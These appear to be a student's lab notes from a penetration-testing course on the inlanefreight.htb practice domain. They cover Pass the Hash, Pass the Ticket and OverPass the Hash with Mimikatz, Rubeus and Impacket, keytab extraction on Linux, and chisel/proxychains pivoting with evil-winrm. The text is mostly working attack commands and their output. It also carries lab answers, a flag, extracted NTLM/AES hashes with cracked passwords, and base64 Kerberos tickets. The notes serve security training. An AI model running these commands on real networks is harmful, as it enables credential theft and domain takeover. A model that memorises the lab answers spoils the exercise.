
#### Pass the Hash from Windows Using Mimikatz:

```cmd
 mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> or  /NTLM: <hash> /domain:inlanefreight.htb /run:cmd.exe" exit
```

#### Invoke-TheHash with WMI

  Pass the Hash (PtH)

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash <HASH>
```

## Pass the Hash with Impacket (Linux)

```shell 
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

# Pass the ticket from wins

## Harvesting Kerberos Tickets from Windows

- On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process

- As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

#### mimikatz 

```cmd 
 sekurlsa::tickets /export
```

> The tickets that end with `$` correspond to the computer account

> users have a @ to seperate service name and domain :
> `[randomvalue]-username@service-domain.local.kirbi`.


#### Rubeus - Export Tickets

```cmd
Rubeus.exe dump /nowrap
```

>**Note:** To collect all tickets we need to execute Mimikatz or rubeus as an administrator.

## Pass the Key or OverPass the Hash

#### Mimikatz - Extract Kerberos Keys

dump sKerberos encryption keys 

```cmd
1. mimikatz.exe
2. privilege::debug
3. skurlsa::ekeys

```


### forging the ticket with rubeus

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

```cmd
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

> **Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

>**Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

## Pass the Ticket (PtT)

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Convert .kirbi to Base64 Format

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
#### Pass the Ticket - Base64 Format

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

# questions windows

#### question 1
>Anweser: 3
>method: rubeus.exe dump /nowrap

#### question 2
> anwser: Learn1ng_M0r3_Tr1cks_with_J0hn
> method: 

```cmd 
Rubeus.exe ptt /domain:inlanefreight.htb /user:john /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6UlaZVVILq6z4Z4bQFb3UqGkpGnCkyFq9iSulCp7Mp8iBwo1zJdgm7nR/q38HpTla3/TSBA3xajCuoiibTGeA9rAIcj11DokusccRrRRaHxFJHd/Af3AtGeYM18TTdnz<snip>

```
![[Pasted image 20250131115341.png]]


#### question 3

aes256-> 
```
mimikatz.exe
sekurlsa::ekeys
```

![[Pasted image 20250131120132.png]]
![[Pasted image 20250131120303.png]]
# Pass the Ticket (PtT) from Linux

**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory.

#### Linux Auth via Port Forward

```shell
 ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```
#### Identifying Linux and Active Directory Integration

```shell
realm list
```

#### PS - Check if Linux Machine is Domain Joined

```shell
ps -ef | grep -i "winbind\|sssd"
```

#### Finding Keytab Files

```shell
find / -name *keytab* -ls 2>/dev/null
```

> **Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

```shell
crontab -l
```
#### Reviewing Environment Variables for ccache Files.
```shell
env | grep -i krb5
```

#### Impersonating a User with a keytab

```shell
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

```

#### Connecting to SMB Share as Carlos

```shell-session
smbclient //dc01/carlos -k -c ls
```

>**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`

### Keytab Extract

To connec tto carlos we need his apssword so we need to decode and extract the info from .keytab file

The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes. 

https://github.com/sosdave/KeyTabExtract

```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

>With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

## Abusing Keytab ccache


## Using Linux Attack Tools with Kerberos

Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

In this scenario, our attack host doesn't have a connection to the `KDC/Domain Controller`, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.ž

```shell
cat /etc/hosts
```

#### Proxychains Configuration File

```shell
cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080

```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

```cmd
 c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
**Note:** The client IP is your attack host IP.

### Impacket

#### Using Impacket with proxychains and Kerberos Authentication

```shell
proxychains impacket-wmiexec dc01 -k
```

### Evil-Winrm

To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.

#### Installing Kerberos Authentication Package

```shell
sudo apt-get install krb5-user -y
```

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

```shell-session
cat /etc/krb5.conf
```

```shell
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

#### Linikatz

https://github.com/CiscoCXSecurity/linikatz

### exercises

![[Pasted image 20250131135045.png]]

> [!NOTE]
> [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
> [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
> [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
> [+] Keytab File successfully imported.
> 	REALM : INLANEFREIGHT.HTB
> 	SERVICE PRINCIPAL : carlos/
> 	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60 - Password5
> 	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
> 	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4



![[Pasted image 20250131135141.png]]
```shell 
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py .scripts/svc_workstations.kt 
```

> [!NOTE]
> 
> [!] No RC4-HMAC located. Unable to extract NTLM hashes.
> [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
> [!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
> [+] Keytab File successfully imported.
> 	REALM : INLANEFREIGHT.HTB
> 	SERVICE PRINCIPAL : svc_workstations/
> 	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d

```
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/john.keytab

```

> [!NOTE]
> [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
> [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
> [!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
> [+] Keytab File successfully imported.
> 	REALM : INLANEFREIGHT.HTB
> 	SERVICE PRINCIPAL : john/
> 	NTLM HASH : c4b0e1b10c7ce2c4723b4e2407ef81a2 - Password3
> 	AES-256 HASH : 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc

![[Pasted image 20250131153929.png]]

![[Pasted image 20250131153944.png]]